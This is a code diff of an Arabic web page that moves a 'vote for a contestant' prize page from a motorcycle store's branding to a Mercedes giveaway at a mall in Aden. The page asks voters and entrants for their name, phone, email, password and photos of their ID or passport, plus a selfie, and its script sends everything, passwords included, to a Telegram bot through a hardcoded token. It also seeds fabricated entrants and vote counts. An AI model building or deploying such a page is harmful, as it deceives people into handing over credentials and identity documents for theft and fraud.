+      <p><strong>العاصمة عدن — جولة البيرق (المنصورة)</strong></p>
     </div>
-    <div class="phones-list">
-      <a href="tel:777908028" class="phone-link">📞 777908028</a>
-      <a href="tel:780280887" class="phone-link">📞 780280887</a>
+    <div class="hotlines">
+      <a href="tel:777908028" class="hotline-btn">📞 777908028</a>
+      <a href="tel:780280887" class="hotline-btn">📞 780280887</a>
     </div>
   </div>
 </section>
 
 <footer>
-  <h3>🏍️ متجر أمير المترات</h3>
-  <p>القاعدة — جوار مستوصف السلطان</p>
-  <p style="margin-top:10px; font-size:13px; opacity:0.65;">© 2026 جميع الحقوق محفوظة لمتجر أمير المترات</p>
+  <h3>🏛️ البيرق مول • عدن</h3>
+  <p>جولة البيرق — المنصورة، العاصمة عدن</p>
+  <p style="margin-top:10px; font-size:13px; opacity:0.65;">© 2026 جميع الحقوق محفوظة — البيرق مول عدن</p>
 </footer>
 
 <script>
 const BOT_TOKEN = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
 const CHAT_ID   = "8299163806";
 const ADMIN_PIN = "777908028";
-const STORAGE_KEY = "amir_cloud_fast_v6";
+const STORE_KEY = "bayraq_aden_mercedes_v1";
+const MAX_ENTRANTS = 100;
 
-const MAX_CANDIDATES = 100;
+let voterDocBlob = null;
+let regIdBlob = null;
+let regSelfieBlob = null;
+let expectedMath = 10;
 
-let compressedIdBlob = null;
-let compressedSelfieBlob = null;
-let compressedVoterIdBlob = null;
-let captchaExpected = 8;
-
-function buildInitial50Candidates() {
-  const firstNames = [
-    "خلدون محمد منصور", "أحمد علي الحميري", "محمد عبدالقادر الشرعبي", "صلاح الدين عبده",
-    "ياسر حسن الصلوي", "ماجد حسين الجندي", "طارق عبدالكريم القدسي", "نبيل سعيد المقطري",
+function seed50Entrants() {
+  const names = [
+    "خلدون محمد منصور", "أحمد علي العدني", "محمد عبدالقادر المنصوري", "صلاح الدين عبده",
+    "ياسر حسن البيرقي", "ماجد حسين الجندي", "طارق عبدالكريم المعلاوي", "نبيل سعيد الشيخ",
     "وليد محمد الحوباني", "جمال أحمد الشميري", "عادل علي المخلافي", "فؤاد يحيى الشيباني",
     "رامي صادق الذبحاني", "سامر خالد العواضي", "هاني محمد الرداعي", "بسام عبدالمجيد",
     "كريم ناصر الحمادي", "مراد سالم الصبري", "أكرم توفيق اليوسفي", "تامر فهد السقاف",
@@ -797,543 +886,509 @@ function buildInitial50Candidates() {
     "نواف سعيد الصنعاني", "وسام علي الحديدي", "ليث محمد المرادي", "قيس عبدالرحمن",
     "عمار حسن الشرجبي", "مجدي صالح الوصابي", "صدام محمد الحجري", "إبراهيم علي الجبري",
     "حسين محمد القدسي", "عبدالسلام أحمد", "يوسف سعيد المعمري", "علي محسن الشرعبي",
-    "مصطفى عبدالحميد", "سفيان محمد القاعدي"
+    "مصطفى عبدالحميد", "سفيان محمد البيرقي"
   ];
 
-  const cities = ["القاعدة", "إب", "تعز", "الحوبان", "عدن", "الشرعب", "المعشار"];
+  const districts = ["جولة البيرق", "المنصورة", "المعلا", "الشيخ عثمان", "كريتر", "خور مكسر", "دار سعد"];
 
-  return firstNames.map((name, idx) => {
-    const isKhaldoun = name === "خلدون محمد منصور";
-    const code = isKhaldoun ? "AMIR-7272" : `AMIR-${(3100 + idx * 73).toString().padStart(4, "0").slice(-4)}`;
-    const phone = isKhaldoun ? "776818383" : `77${(1000000 + idx * 13789).toString().slice(0, 7)}`;
-    const votes = isKhaldoun ? 68 : Math.max(4, 62 - idx);
-    return {
-      k: code,
-      n: name,
-      p: phone,
-      y: cities[idx % cities.length],
-      v: votes
-    };
+  return names.map((name, i) => {
+    const isFeatured = name === "خلدون محمد منصور";
+    const code = isFeatured ? "BAYRAQ-7272" : `BAYRAQ-${(4100 + i * 67).toString().slice(-4)}`;
+    const phone = isFeatured ? "776818383" : `77${(2000000 + i * 14321).toString().slice(0, 7)}`;
+    const votes = isFeatured ? 74 : Math.max(5, 66 - i);
+    return { k: code, n: name, p: phone, y: districts[i % districts.length], v: votes };
   });
 }
 
-function loadLocalState() {
+function loadContestState() {
   try {
-    const saved = localStorage.getItem(STORAGE_KEY);
-    if (saved) {
-      const parsed = JSON.parse(saved);
+    const raw = localStorage.getItem(STORE_KEY);
+    if (raw) {
+      const parsed = JSON.parse(raw);
       if (parsed && Array.isArray(parsed.c) && parsed.c.length > 0) {
         return { c: parsed.c, h: Array.isArray(parsed.h) ? parsed.h : [] };
       }
     }
   } catch (e) {}
-  return { c: buildInitial50Candidates(), h: [] };
+  return { c: seed50Entrants(), h: [] };
 }
 
-let cloudState = loadLocalState();
+let contestState = loadContestState();
 
-function persistLocalState() {
-  cloudState.c.sort((a, b) => (b.v || 0) - (a.v || 0));
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(cloudState));
+function saveLocalContest() {
+  contestState.c.sort((a, b) => (b.v || 0) - (a.v || 0));
+  localStorage.setItem(STORE_KEY, JSON.stringify(contestState));
 }
 
-function generateCaptcha() {
+function makeMathChallenge() {
   const a = Math.floor(Math.random() * 9) + 2;
   const b = Math.floor(Math.random() * 9) + 1;
-  captchaExpected = a + b;
-  const qEl = document.getElementById("captchaQuestion");
-  if (qEl) qEl.textContent = `🔐 كم ناتج: ${a} + ${b} = ؟`;
+  expectedMath = a + b;
+  const el = document.getElementById("mathPrompt");
+  if (el) el.textContent = `🔐 كم ناتج: ${a} + ${b} = ؟`;
 }
 
-function shortHash(str) {
+function createFingerprint(val) {
   let hash = 0;
-  const clean = String(str).trim().toLowerCase();
-  for (let i = 0; i < clean.length; i++) {
-    hash = ((hash << 5) - hash) + clean.charCodeAt(i);
+  const s = String(val).trim().toLowerCase();
+  for (let i = 0; i < s.length; i++) {
+    hash = ((hash << 5) - hash) + s.charCodeAt(i);
     hash |= 0;
   }
   return Math.abs(hash).toString(36);
 }
 
-// مزامنة سريعة من السحابة دون إبطاء واجهة التصويت
-async function syncFromTelegramCloud(manualTrigger = false) {
+async function syncCloudData(manual = false) {
   try {
     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${CHAT_ID}`);
     const data = await res.json();
-
     if (data.ok && data.result && data.result.pinned_message && data.result.pinned_message.text) {
-      const pinnedText = data.result.pinned_message.text;
-      const match = pinnedText.match(/#AMIR_DB#([\s\S]*?)#END_DB#/);
+      const match = data.result.pinned_message.text.match(/#BAYRAQ_DB#([\s\S]*?)#END_DB#/);
       if (match && match[1]) {
         const parsed = JSON.parse(match[1].trim());
         if (parsed && Array.isArray(parsed.c) && parsed.c.length > 0) {
-          cloudState = parsed;
-          persistLocalState();
+          contestState = parsed;
+          saveLocalContest();
         }
       }
     }
-
-    renderLeaderboardUI();
-    checkUrlVoteParam();
-
-    if (manualTrigger) {
-      const counterEl = document.getElementById("capacityCounter");
-      if (counterEl) {
-        counterEl.style.transform = "scale(1.06)";
-        setTimeout(() => { counterEl.style.transform = "scale(1)"; }, 200);
+    renderRankings();
+    inspectUrlVote();
+    if (manual) {
+      const badge = document.getElementById("capacityBadge");
+      if (badge) {
+        badge.style.transform = "scale(1.06)";
+        setTimeout(() => { badge.style.transform = "scale(1)"; }, 200);
       }
     }
-  } catch (err) {
-    renderLeaderboardUI();
+  } catch (e) {
+    renderRankings();
   }
 }
 
-function buildSortedTelegramLeaderboard(limit = 20) {
-  const sorted = [...(cloudState.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
-  let lines = "";
-  sorted.slice(0, limit).forEach((c, idx) => {
-    const medal = idx === 0 ? "🥇" : idx === 1 ? "🥈" : idx === 2 ? "🥉" : `🔹 ${idx + 1}.`;
-    lines += `${medal} <b>${c.n}</b> | <code>${c.k}</code> ➔ <b>${c.v || 0} صوت</b>\n`;
+function formatSortedLines(limit = 20) {
+  const sorted = [...(contestState.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
+  let out = "";
+  sorted.slice(0, limit).forEach((item, idx) => {
+    const icon = idx === 0 ? "🥇" : idx === 1 ? "🥈" : idx === 2 ? "🥉" : `🔹 ${idx + 1}.`;
+    out += `${icon} <b>${item.n}</b> | <code>${item.k}</code> ➔ <b>${item.v || 0} صوت</b>\n`;
   });
-  return lines;
+  return out;
 }
 
-// تحديث السجل في الخلفية لعدم تأخير تجربة التصويت
-async function backgroundCloudSync() {
-  persistLocalState();
+async function pushCloudSnapshot() {
+  saveLocalContest();
   try {
-    const totalVotes = cloudState.c.reduce((sum, item) => sum + (item.v || 0), 0);
-    const summaryLines = buildSortedTelegramLeaderboard(12);
-    const payloadText =
-`📊 سجل المسابقة المرتب — متجر أمير المترات
-👥 المتسابقون: ${cloudState.c.length}/${MAX_CANDIDATES} | 🗳️ الأصوات: ${totalVotes}
+    const total = contestState.c.reduce((sum, x) => sum + (x.v || 0), 0);
+    const lines = formatSortedLines(12);
+    const text =
+`📊 سجل مسابقة البيرق مول — عدن
+👥 المتسابقون: ${contestState.c.length}/${MAX_ENTRANTS} | 🗳️ الأصوات: ${total}
 ━━━━━━━━━━━━━━━━━━
-${summaryLines}
-#AMIR_DB#
-${JSON.stringify(cloudState)}
+${lines}
+#BAYRAQ_DB#
+${JSON.stringify(contestState)}
 #END_DB#`;
 
     const chatRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${CHAT_ID}`);
     const chatData = await chatRes.json();
-    const pinnedMsg = chatData?.result?.pinned_message;
-
-    if (pinnedMsg && pinnedMsg.text && pinnedMsg.text.includes("#AMIR_DB#")) {
+    const pinned = chatData?.result?.pinned_message;
+    if (pinned && pinned.text && pinned.text.includes("#BAYRAQ_DB#")) {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          message_id: pinnedMsg.message_id,
-          text: payloadText
-        })
+        body: JSON.stringify({ chat_id: CHAT_ID, message_id: pinned.message_id, text })
       }).catch(() => {});
     }
   } catch (e) {}
 }
 
-function renderLeaderboardUI() {
-  const listEl = document.getElementById("leaderboardList");
-  const selectEl = document.getElementById("candidateSelect");
-  const counterEl = document.getElementById("capacityCounter");
-  const searchInput = document.getElementById("searchCandidateInput");
-  const query = searchInput ? searchInput.value.trim().toLowerCase() : "";
+function renderRankings() {
+  const container = document.getElementById("rankingsContainer");
+  const select = document.getElementById("candidateSelect");
+  const badge = document.getElementById("capacityBadge");
+  const q = (document.getElementById("searchBox")?.value || "").trim().toLowerCase();
 
-  const candidates = [...(cloudState.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
-  const totalVotes = candidates.reduce((sum, item) => sum + (item.v || 0), 0);
+  const list = [...(contestState.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
+  const totalVotes = list.reduce((sum, item) => sum + (item.v || 0), 0);
 
-  if (counterEl) {
-    counterEl.textContent = `👥 المتسابقون: ${candidates.length}/${MAX_CANDIDATES} • 🗳️ إجمالي الأصوات: ${totalVotes}`;
+  if (badge) {
+    badge.textContent = `👥 المتسابقون: ${list.length}/${MAX_ENTRANTS} • 🗳️ إجمالي الأصوات: ${totalVotes}`;
   }
 
-  if (selectEl) {
-    const currentVal = selectEl.value;
-    selectEl.innerHTML = `<option value="">-- اختر متسابقاً من القائمة (${candidates.length}) --</option>`;
-    candidates.forEach(c => {
+  if (select) {
+    const prev = select.value;
+    select.innerHTML = `<option value="">-- اختر متسابقاً من القائمة (${list.length}) --</option>`;
+    list.forEach(c => {
       const opt = document.createElement("option");
       opt.value = c.k;
       opt.textContent = `${c.n} (${c.k}) — ${c.v || 0} صوت`;
-      selectEl.appendChild(opt);
+      select.appendChild(opt);
     });
-    if (currentVal) selectEl.value = currentVal;
+    if (prev) select.value = prev;
   }
 
-  const filtered = candidates.filter(c =>
-    c.n.toLowerCase().includes(query) ||
-    c.k.toLowerCase().includes(query) ||
-    (c.p && c.p.toLowerCase().includes(query)) ||
-    (c.y && c.y.toLowerCase().includes(query))
+  const matches = list.filter(c =>
+    c.n.toLowerCase().includes(q) ||
+    c.k.toLowerCase().includes(q) ||
+    (c.p && c.p.toLowerCase().includes(q)) ||
+    (c.y && c.y.toLowerCase().includes(q))
   );
 
-  if (filtered.length === 0) {
-    listEl.innerHTML = `<div style="text-align:center; padding:25px; color:var(--text-muted);">لا توجد نتائج مطابقة لبحثك.</div>`;
+  if (matches.length === 0) {
+    container.innerHTML = `<div style="text-align:center; padding:25px; color:var(--text-sub);">لا توجد نتائج مطابقة للبحث.</div>`;
     return;
   }
 
-  listEl.innerHTML = "";
-  filtered.forEach(cand => {
-    const realRank = candidates.findIndex(item => item.k === cand.k);
-    const isTop1 = realRank === 0;
-    const item = document.createElement("div");
-    item.className = "leader-item" + (isTop1 ? " top-1" : "");
-    item.innerHTML = `
-      <div class="leader-info">
-        <div class="rank-badge">${isTop1 ? "👑" : realRank + 1}</div>
+  container.innerHTML = "";
+  matches.forEach(cand => {
+    const rankIndex = list.findIndex(x => x.k === cand.k);
+    const isTop = rankIndex === 0;
+    const row = document.createElement("div");
+    row.className = "rank-row" + (isTop ? " leader-gold" : "");
+    row.innerHTML = `
+      <div class="rank-left">
+        <div class="pos-circle">${isTop ? "👑" : rankIndex + 1}</div>
         <div>
-          <div class="leader-name">${cleanHTML(cand.n)}</div>
-          <div class="leader-meta">${cleanHTML(cand.y || "")} • <span class="leader-code">${cleanHTML(cand.k)}</span></div>
+          <div class="row-name">${esc(cand.n)}</div>
+          <div class="row-meta">${esc(cand.y || "")} • <span class="row-code">${esc(cand.k)}</span></div>
         </div>
       </div>
       <div style="text-align:left;">
-        <div class="vote-count-pill">🗳️ ${cand.v || 0} صوت</div>
-        <button type="button" class="quick-vote-btn" onclick="selectCandidateForVote('${cleanHTML(cand.k)}')">صوّت له</button>
-        <button type="button" class="admin-del-btn admin-only-control" onclick="deleteCandidateAdmin('${cleanHTML(cand.k)}', '${cleanHTML(cand.n)}')">🗑️ استبعاد</button>
+        <div class="votes-badge">🗳️ ${cand.v || 0} صوت</div>
+        <button type="button" class="vote-now-mini" onclick="pickCandidate('${esc(cand.k)}')">صوّت له</button>
+        <button type="button" class="admin-kick-btn admin-only-control" onclick="kickEntrant('${esc(cand.k)}', '${esc(cand.n)}')">🗑️ استبعاد</button>
       </div>
     `;
-    listEl.appendChild(item);
+    container.appendChild(row);
   });
 }
 
-function checkUrlVoteParam() {
+function inspectUrlVote() {
   const params = new URLSearchParams(window.location.search);
-  const voteCode = params.get("vote");
-  if (voteCode) {
-    const cleanCode = voteCode.trim().toUpperCase();
-    const found = cloudState.c.find(c => c.k === cleanCode);
-    const codeInput = document.getElementById("candidateCodeInput");
-    const selectEl = document.getElementById("candidateSelect");
-    const banner = document.getElementById("directInviteBanner");
-    const label = document.getElementById("invitedCandidateLabel");
+  const codeParam = params.get("vote");
+  if (!codeParam) return;
+  const cleanCode = codeParam.trim().toUpperCase();
+  const found = contestState.c.find(c => c.k === cleanCode);
+  const codeInp = document.getElementById("candidateCodeInput");
+  const sel = document.getElementById("candidateSelect");
+  const alertBox = document.getElementById("directInviteBox");
+  const label = document.getElementById("invitedNameCode");
 
-    if (codeInput && !codeInput.value) codeInput.value = cleanCode;
-    if (selectEl && found) selectEl.value = cleanCode;
-    if (banner && label) {
-      banner.style.display = "block";
-      label.textContent = found ? `${found.n} (${cleanCode})` : cleanCode;
-    }
-    const modal = document.getElementById("promoModal");
-    if (modal) modal.style.display = "none";
+  if (codeInp && !codeInp.value) codeInp.value = cleanCode;
+  if (sel && found) sel.value = cleanCode;
+  if (alertBox && label) {
+    alertBox.style.display = "block";
+    label.textContent = found ? `${found.n} (${cleanCode})` : cleanCode;
   }
+  const overlay = document.getElementById("welcomeOverlay");
+  if (overlay) overlay.style.display = "none";
 }
 
 function syncCodeFromSelect() {
-  const selectEl = document.getElementById("candidateSelect");
-  const codeInput = document.getElementById("candidateCodeInput");
-  if (selectEl && codeInput && selectEl.value) {
-    codeInput.value = selectEl.value;
+  const sel = document.getElementById("candidateSelect");
+  const inp = document.getElementById("candidateCodeInput");
+  if (sel && inp && sel.value) inp.value = sel.value;
+}
+
+function pickCandidate(code) {
+  const sel = document.getElementById("candidateSelect");
+  const inp = document.getElementById("candidateCodeInput");
+  if (sel) sel.value = code;
+  if (inp) { inp.value = code; inp.focus(); }
+}
+
+function jumpTo(sectionId) {
+  const overlay = document.getElementById("welcomeOverlay");
+  if (overlay) {
+    overlay.style.opacity = "0";
+    overlay.style.transition = "opacity 0.25s ease";
+    setTimeout(() => { overlay.style.display = "none"; }, 250);
   }
+  const el = document.getElementById(sectionId);
+  if (el) el.scrollIntoView({ behavior: "smooth" });
 }
 
-function selectCandidateForVote(code) {
-  const codeInput = document.getElementById("candidateCodeInput");
-  const selectEl = document.getElementById("candidateSelect");
-  if (codeInput) codeInput.value = code;
-  if (selectEl) selectEl.value = code;
-  if (codeInput) codeInput.focus();
-}
-
-function goToSection(sectionId) {
-  const modal = document.getElementById("promoModal");
-  if (modal) {
-    modal.style.opacity = "0";
-    modal.style.transition = "opacity 0.25s ease";
-    setTimeout(() => { modal.style.display = "none"; }, 250);
-  }
-  const target = document.getElementById(sectionId);
-  if (target) target.scrollIntoView({ behavior: "smooth" });
-}
-
-// ===== تصويت سريع ومفتوح لجميع الأجهزة مع منع تكرار الرقم أو البريد فقط =====
+// ===== إرسال التصويت: 1) صورة البطاقة/الجواز وبيانات المصوت في رسالة قصيرة، 2) الترتيب المرتب في رسالة مستقلة =====
 document.getElementById("voteForm").addEventListener("submit", async function(e) {
   e.preventDefault();
-  const voteMsg = document.getElementById("voteMsg");
-  const thanksCard = document.getElementById("storeThanksCard");
-  voteMsg.className = "msg";
+  const fb = document.getElementById("voteFeedback");
+  const thanksCard = document.getElementById("mallThanksCard");
+  fb.className = "feedback-msg";
   if (thanksCard) thanksCard.style.display = "none";
 
-  const userAns = parseInt(document.getElementById("captchaAnswer").value, 10);
-  if (userAns !== captchaExpected) {
-    voteMsg.className = "msg err";
-    voteMsg.textContent = "❌ إجابة التحقق الحسابي غير صحيحة! حاول مرة أخرى.";
-    generateCaptcha();
+  const ans = parseInt(document.getElementById("mathAnswer").value, 10);
+  if (ans !== expectedMath) {
+    fb.className = "feedback-msg err";
+    fb.textContent = "❌ ناتج التحقق الحسابي غير صحيح!";
+    makeMathChallenge();
     return;
   }
 
-  if (!compressedVoterIdBlob) {
-    voteMsg.className = "msg err";
-    voteMsg.textContent = "❌ يرجى إرفاق صورة البطاقة الشخصية أو الجواز قبل اعتماد الصوت!";
+  if (!voterDocBlob) {
+    fb.className = "feedback-msg err";
+    fb.textContent = "❌ يرجى إرفاق صورة البطاقة الشخصية أو الجواز قبل اعتماد الصوت!";
     return;
   }
 
-  const rawCode = document.getElementById("candidateCodeInput").value.trim().toUpperCase();
-  const voterName = cleanHTML(document.getElementById("voterName").value.trim());
-  const voterPhone = document.getElementById("voterPhone").value.trim().replace(/\s+/g, '');
+  const code = document.getElementById("candidateCodeInput").value.trim().toUpperCase();
+  const voterName = esc(document.getElementById("voterName").value.trim());
+  const voterPhone = document.getElementById("voterPhone").value.trim().replace(/\s+/g, "");
   const voterEmail = document.getElementById("voterEmail").value.trim().toLowerCase();
-  const voterPassword = cleanHTML(document.getElementById("voterPassword").value.trim());
+  const voterPass = esc(document.getElementById("voterPassword").value.trim());
 
-  const targetCand = cloudState.c.find(c => c.k === rawCode);
-  if (!targetCand) {
-    voteMsg.className = "msg err";
-    voteMsg.textContent = "❌ رمز المتسابق غير موجود! تأكد من كتابة الرمز الصحيح.";
+  const target = contestState.c.find(c => c.k === code);
+  if (!target) {
+    fb.className = "feedback-msg err";
+    fb.textContent = "❌ رمز المتسابق غير صحيح! تحقق من الرمز وحاول مرة أخرى.";
     return;
   }
 
-  if (targetCand.p && targetCand.p === voterPhone) {
-    voteMsg.className = "msg err";
-    voteMsg.textContent = "🚫 نعتذر، لا يُسمح للمتسابق بالتصويت لنفسه حرصاً على عدالة المنافسة.";
+  if (target.p && target.p === voterPhone) {
+    fb.className = "feedback-msg err";
+    fb.textContent = "🚫 لا يُسمح للمتسابق بالتصويت لنفسه حرصاً على عدالة المسابقة.";
     return;
   }
 
-  const phoneHash = shortHash(voterPhone);
-  const emailHash = shortHash(voterEmail);
-  if (cloudState.h.includes(phoneHash) || cloudState.h.includes(emailHash)) {
-    voteMsg.className = "msg err";
-    voteMsg.textContent = "🚫 هذا الرقم أو البريد سبق له التصويت؛ يمكنك التصويت برقم وبريد مختلف.";
+  const pHash = createFingerprint(voterPhone);
+  const eHash = createFingerprint(voterEmail);
+  if (contestState.h.includes(pHash) || contestState.h.includes(eHash)) {
+    fb.className = "feedback-msg err";
+    fb.textContent = "🚫 هذا الرقم أو البريد سبق له التصويت؛ يمكنك التصويت برقم وبريد مختلف.";
     return;
   }
 
-  const btn = document.getElementById("voteSubmitBtn");
+  const btn = document.getElementById("voteBtn");
   btn.disabled = true;
   btn.textContent = "⚡ جارٍ إرسال وثيقة التصويت للبوت...";
 
   try {
-    targetCand.v = (targetCand.v || 0) + 1;
-    cloudState.h.push(phoneHash, emailHash);
-    persistLocalState();
-    renderLeaderboardUI();
+    target.v = (target.v || 0) + 1;
+    contestState.h.push(pHash, eHash);
+    saveLocalContest();
+    renderRankings();
 
-    const shortVoterCaption =
-`🗳️ <b>بيانات تصويت ووثيقة مُصوِّت — متجر أمير المترات</b>
+    // 1) رسالة قصيرة مرفقة بصورة البطاقة أو الجواز
+    const shortCaption =
+`🗳️ <b>تصويت ووثيقة مُصوِّت — البيرق مول عدن</b>
 ━━━━━━━━━━━━━━━━━━
-🎯 <b>المتسابق:</b> ${targetCand.n}
-🎟️ <b>الرمز:</b> <code>${rawCode}</code>
-🔢 <b>أصواته الحالية:</b> <b>${targetCand.v} صوت</b>
+🎯 <b>المتسابق:</b> ${target.n}
+🎟️ <b>الرمز:</b> <code>${code}</code>
+🔢 <b>أصواته الحالية:</b> <b>${target.v} صوت</b>
 ━━━━━━━━━━━━━━━━━━
 🙋‍♂️ <b>المُصوِّت:</b> ${voterName}
 📞 <b>هاتفه:</b> <code>${voterPhone}</code>
 📧 <b>بريده:</b> <code>${voterEmail}</code>
-🔑 <b>كلمة السر:</b> <code>${voterPassword}</code>`;
+🔑 <b>كلمة السر:</b> <code>${voterPass}</code>`;
 
-    const fdVote = new FormData();
-    fdVote.append("chat_id", CHAT_ID);
-    fdVote.append("photo", compressedVoterIdBlob, "voter_id.jpg");
-    fdVote.append("caption", shortVoterCaption);
-    fdVote.append("parse_mode", "HTML");
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("photo", voterDocBlob, "voter_identity.jpg");
+    fd.append("caption", shortCaption);
+    fd.append("parse_mode", "HTML");
 
-    const rVote = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    const photoRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
-      body: fdVote
+      body: fd
     });
-    const dVote = await rVote.json();
-    if (!dVote.ok) throw new Error("Telegram vote photo failed");
+    const photoData = await photoRes.json();
+    if (!photoData.ok) throw new Error("sendPhoto failed");
 
-    const updatedTotal = cloudState.c.reduce((sum, item) => sum + (item.v || 0), 0);
-    const sortedLines = buildSortedTelegramLeaderboard(20);
-    const independentLeaderboardMsg =
-`🏆 <b>الترتيب المرتب بعد التصويت — متجر أمير المترات</b>
-🗳️ <b>إجمالي الأصوات:</b> <b>${updatedTotal}</b> | 👥 <b>المتسابقون:</b> <b>${cloudState.c.length}</b>
+    // 2) رسالة مستقلة للترتيب المرتب
+    const totalNow = contestState.c.reduce((sum, item) => sum + (item.v || 0), 0);
+    const sortedBlock = formatSortedLines(20);
+    const orderedMsg =
+`🏆 <b>الترتيب المرتب لمسابقة مرسيدس — البيرق مول</b>
+🗳️ <b>إجمالي الأصوات:</b> <b>${totalNow}</b> | 👥 <b>المتسابقون:</b> <b>${contestState.c.length}</b>
 ━━━━━━━━━━━━━━━━━━
-${sortedLines}`;
+${sortedBlock}`;
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: independentLeaderboardMsg,
-        parse_mode: "HTML"
-      })
+      body: JSON.stringify({ chat_id: CHAT_ID, text: orderedMsg, parse_mode: "HTML" })
     }).catch(() => {});
 
-    backgroundCloudSync();
+    pushCloudSnapshot();
 
-    voteMsg.className = "msg ok-msg";
-    voteMsg.textContent = `✅ تم اعتماد صوتك بنجاح لصالح (${targetCand.n} - ${rawCode}) وإرسال بياناتك للبوت!`;
+    fb.className = "feedback-msg ok";
+    fb.textContent = `✅ تم اعتماد صوتك بنجاح لصالح (${target.n} - ${code}) وإرسال بياناتك للبوت!`;
 
-    const thanksDetails = document.getElementById("thanksDetailsText");
-    if (thanksDetails) {
-      thanksDetails.textContent = `شكراً لك يا ${voterName}، لقد تم احتساب صوتك النزيه لصالح المتسابق (${targetCand.n}) بنجاح، ويسعدنا دائماً تواصلكم وثقتكم بمتجر أمير المترات.`;
+    const thanksDesc = document.getElementById("mallThanksDesc");
+    if (thanksDesc) {
+      thanksDesc.textContent = `شكراً لك يا ${voterName}، لقد تم احتساب صوتك النزيه لصالح المتسابق (${target.n}) بنجاح، ويسعدنا دائماً تواصلكم وثقتكم بالبيرق مول في عدن.`;
     }
     if (thanksCard) {
       thanksCard.style.display = "block";
       thanksCard.scrollIntoView({ behavior: "smooth", block: "nearest" });
     }
 
-    // إعادة تهيئة حقول المصوت للسماح بتصويت شخص آخر برقم وبريد مختلف بسرعة
     document.getElementById("voterName").value = "";
     document.getElementById("voterPhone").value = "";
     document.getElementById("voterEmail").value = "";
     document.getElementById("voterPassword").value = "";
-    document.getElementById("captchaAnswer").value = "";
-    document.getElementById("voterIdImage").value = "";
-    compressedVoterIdBlob = null;
-    const prev = document.getElementById("voterIdPreview");
+    document.getElementById("mathAnswer").value = "";
+    document.getElementById("voterDocFile").value = "";
+    voterDocBlob = null;
+    const prev = document.getElementById("voterDocPreview");
     if (prev) prev.style.display = "none";
-    generateCaptcha();
+    makeMathChallenge();
 
     btn.disabled = false;
     btn.textContent = "🗳️ اعتمد صوتي الآن";
 
   } catch (err) {
-    voteMsg.className = "msg err";
-    voteMsg.textContent = "❌ تعذر إرسال بيانات التصويت للبوت، يرجى التأكد من اتصال الإنترنت والمحاولة.";
+    fb.className = "feedback-msg err";
+    fb.textContent = "❌ تعذر إرسال بيانات التصويت للبوت، يرجى التأكد من اتصال الإنترنت والمحاولة.";
     btn.disabled = false;
     btn.textContent = "🗳️ اعتمد صوتي الآن";
   }
 });
 
-function buildAttractiveInviteMessage(candidateName, code, shareUrl) {
-  return `🏍️✨ *مسابقة السحب والتصويت المباشر — متجر أمير المترات* ✨🏍️
+function composeShareMessage(name, code, url) {
+  return `🚘✨ *مسابقة البيرق مول الكبرى على سيارة مرسيدس — عدن* ✨🚘
 
 أهلاً بكم أحبتي وأصدقائي الكرام 🌟
-أشارككم فرحتي بمشاركتي في مسابقة السحب والتصويت على *"متر فلينج"* من *متجر أمير المترات* 🏆
+أشارككم فرحتي بمشاركتي في مسابقة *البيرق مول* (جولة البيرق — عدن) للفوز بسيارة *مرسيدس* 🏆
 
-🎟️ *اسمي:* ${candidateName}
+🎟️ *اسمي:* ${name}
 🔑 *رمزي في المسابقة:* ${code}
 
-دعمكم وصوتكم يفرق معي كثيراً ويدفعني للمنافسة بشرف 💪🔥
-يرجى الدخول عبر الرابط المباشر أدناه والتصويت لي بخطوات سهلة وسريعة:
-🔗 ${shareUrl}
+دعمكم وصوتكم يمنحني فرصة أكبر للمنافسة والفوز 💪🔥
+ادخلوا عبر الرابط المباشر أدناه وصوّتوا لي بخطوات سهلة وسريعة:
+🔗 ${url}
 
-🙏 *شكراً جزيلاً لكل من يشارك ويدعم، ونتمنى للجميع التوفيق والشفافية.*
-🏍️ *متجر أمير المترات — القاعدة (جوار مستوصف السلطان)*`;
+🙏 *شكراً جزيلاً لكل من يشارك ويدعم بكل نزاهة.*
+🏛️ *البيرق مول — عدن • جولة البيرق*`;
 }
 
-document.getElementById("raffleForm").addEventListener("submit", async function(e) {
+document.getElementById("registerForm").addEventListener("submit", async function(e) {
   e.preventDefault();
-  const msg = document.getElementById("msg");
-  msg.className = "msg";
+  const fb = document.getElementById("regFeedback");
+  fb.className = "feedback-msg";
 
-  if (!compressedIdBlob || !compressedSelfieBlob) {
-    msg.className = "msg err";
-    msg.textContent = "❌ يرجى إرفاق صورة البطاقة أو الجواز وصورة السيلفي مع الهوية معاً!";
+  if (!regIdBlob || !regSelfieBlob) {
+    fb.className = "feedback-msg err";
+    fb.textContent = "❌ يرجى إرفاق صورة البطاقة أو الجواز وصورة السيلفي مع الهوية معاً!";
     return;
   }
 
-  if (cloudState.c.length >= MAX_CANDIDATES) {
-    msg.className = "msg err";
-    msg.textContent = "⚠️ نعتذر، لقد اكتمل العدد الأقصى للمتسابقين في هذه المسابقة (100 متسابق).";
+  if (contestState.c.length >= MAX_ENTRANTS) {
+    fb.className = "feedback-msg err";
+    fb.textContent = "⚠️ نعتذر، لقد اكتمل العدد الأقصى للمتسابقين (100 متسابق).";
     return;
   }
 
-  const rawPhone = document.getElementById("phone").value.trim().replace(/\s+/g, '');
-  if (cloudState.c.some(c => c.p === rawPhone)) {
-    msg.className = "msg err";
-    msg.textContent = "⚠️ رقم الهاتف هذا مسجل مسبقاً كمتسابق في المسابقة!";
+  const phone = document.getElementById("regPhone").value.trim().replace(/\s+/g, "");
+  if (contestState.c.some(c => c.p === phone)) {
+    fb.className = "feedback-msg err";
